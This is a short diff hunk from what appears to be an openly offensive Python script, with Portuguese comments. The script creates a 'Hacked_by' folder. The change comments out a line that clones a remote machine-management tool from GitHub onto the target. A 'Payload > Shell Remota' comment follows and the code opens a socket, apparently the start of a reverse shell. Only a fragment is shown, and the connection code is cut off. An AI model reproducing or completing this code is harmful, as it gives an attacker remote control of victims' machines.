@@ -62,7 +62,7 @@ while (back == False):
         os.mkdir('Hacked_by:_xRev3rse')
 
         #Tool para gerenciar maquina (opcional & beta)
-        os.system('git clone https://github.com/xRev3rse/RMMtool')
+        #os.system('git clone https://github.com/xRev3rse/RMMtool')
 
         #Payload > Shell Remota
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
